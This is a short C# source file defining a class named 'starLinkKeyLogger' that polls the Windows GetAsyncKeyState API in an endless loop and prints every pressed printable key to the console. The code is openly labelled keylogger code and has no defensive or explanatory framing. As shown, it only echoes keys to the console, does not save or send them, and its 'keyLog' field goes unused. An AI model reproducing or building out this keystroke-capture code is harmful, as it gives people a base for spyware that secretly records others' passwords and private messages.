using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace WindowsLogger.KeyLogger
{
	class starLinkKeyLogger
	{
		[DllImport("User32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		static string keyLog = "";


		public void run()
		{
			while (true)
			{
				Thread.Sleep(10);


				for (int i = 32; i < 127; i++)
				{
					int keyState = GetAsyncKeyState(i);
					if (keyState == 32768)
					{
						Console.Write((char) i + ", ");
					} 
				}
			}
		}


	}
}
